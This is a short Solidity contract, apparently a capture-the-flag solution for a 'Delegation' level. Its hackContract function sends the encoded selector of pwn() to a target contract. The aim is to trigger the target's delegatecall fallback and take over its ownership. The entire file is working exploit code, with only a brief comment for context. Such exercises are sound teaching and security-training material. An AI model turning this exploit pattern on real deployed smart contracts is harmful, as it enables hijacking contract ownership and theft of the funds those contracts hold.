// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "./Delegation.sol";

import "hardhat/console.sol";

contract AttackingDelegation {
    address public contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    /// @dev Pass in function signature as the msg.data, does a low level call and changes the target contracts state
    function hackContract() external {
        /// 0xdd365b8b00000000000000000000000000000000000000000000000000000000
        bytes memory functionEncoding = abi.encode(bytes4(keccak256("pwn()")));
        (bool result, ) = contractAddress.call(functionEncoding);
    }
}
